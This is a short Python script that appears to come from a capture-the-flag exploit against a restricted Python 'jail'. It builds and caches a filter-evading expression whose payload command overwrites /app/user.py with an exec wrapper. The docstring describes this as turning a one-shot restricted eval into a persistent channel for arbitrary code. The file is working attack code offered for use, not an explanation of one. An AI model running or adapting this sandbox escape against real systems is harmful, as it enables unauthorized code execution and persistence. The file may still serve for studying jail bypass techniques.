#!/usr/bin/env python3
"""
Build and cache the bootstrap expression.

The bootstrap replaces /app/user.py with a one line exec wrapper, so from then
on every connection's RAW bytes (which jail.py drops into /app/user_input) are
executed as unfiltered Python by the child.  That turns the one-shot restricted
eval into a persistent arbitrary-code channel.
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import gen  # noqa: E402

BOOT_CMD = "printf 'exec(open(\"/app/user_input\").read())' >/app/user.py"
CACHE = os.path.join(HERE, '..', 'scratch', 'expr_boot.txt')


def boot_expr():
    if os.path.exists(CACHE):
        e = open(CACHE).read().strip()
        if e:
            return e
    expr, n = gen.build(BOOT_CMD)
    assert gen.clean(expr), 'expression has forbidden characters'
    open(CACHE, 'w').write(expr)
    sys.stderr.write('[gen] %d bytes, %d join pieces\n' % (len(expr), n))
    return expr


if __name__ == '__main__':
    e = boot_expr()
    sys.stderr.write('[gen] cmd=%r expr=%d bytes\n' % (BOOT_CMD, len(e)))
